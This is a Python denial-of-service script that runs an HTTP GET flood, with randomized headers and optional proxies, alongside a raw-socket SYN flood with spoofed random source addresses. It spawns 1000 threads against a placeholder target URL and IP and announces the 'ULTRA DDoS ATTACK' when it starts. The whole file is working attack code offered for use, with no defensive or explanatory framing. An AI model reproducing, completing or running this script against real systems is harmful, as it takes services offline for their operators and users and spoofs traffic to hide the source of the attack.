import threading
import requests
import random
import socket
import time
import struct

# CONFIGURATION
TARGET_URL = "http://example.com"  # Change to the target URL
TARGET_IP = "192.168.1.1"          # Target IP for SYN Flood (Modify)
TARGET_PORT = 80                    # Port to attack
THREADS = 1000                      # Number of threads
USE_PROXIES = False                 # Set to True if using proxies
PROXY_LIST = "proxies.txt"           # File containing proxies

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
]

# === Load Proxy List ===
def get_proxy():
    """Retrieve a random proxy from the proxy list."""
    if USE_PROXIES:
        with open(PROXY_LIST, "r") as file:
            proxies = file.read().splitlines()
        return {"http": f"http://{random.choice(proxies)}", "https": f"https://{random.choice(proxies)}"}
    return None

# === HTTP Flood Attack ===
def http_flood():
    """Performs an HTTP GET flood attack with randomized headers."""
    while True:
        try:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Referer": f"https://google.com/search?q={random.randint(1, 100000)}",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive"
            }
            proxy = get_proxy()
            response = requests.get(TARGET_URL, headers=headers, proxies=proxy, timeout=3)
            print(f"[HTTP] Request sent! Status: {response.status_code}")
        except requests.exceptions.RequestException:
            print("[HTTP] Request failed. Retrying...")

# === SYN Flood Attack ===
def syn_flood():
    """Performs a SYN flood attack on a specified target IP and port."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

    while True:
        try:
            # Generate random source IP and port
            src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
            src_port = random.randint(1024, 65535)

            # Build TCP SYN packet
            ip_header = struct.pack(
                "!BBHHHBBH4s4s",
                69, 0, 40, 54321, 0, 255, socket.IPPROTO_TCP, 0,
                socket.inet_aton(src_ip), socket.inet_aton(TARGET_IP)
            )
            tcp_header = struct.pack(
                "!HHLLBBHHH",
                src_port, TARGET_PORT, 0, 0, 5 << 4, 2, 8192, 0, 0
            )

            # Send packet
            sock.sendto(ip_header + tcp_header, (TARGET_IP, TARGET_PORT))
            print(f"[SYN] SYN packet sent from {src_ip}:{src_port} -> {TARGET_IP}:{TARGET_PORT}")

        except Exception as e:
            print(f"[SYN] Error: {e}")

# === Launch Attacks ===
for _ in range(THREADS // 2):
    threading.Thread(target=http_flood).start()
    threading.Thread(target=syn_flood).start()

print(f"🔥 **ULTRA DDoS ATTACK LAUNCHED ON {TARGET_URL} & {TARGET_IP}:{TARGET_PORT}** 🔥")
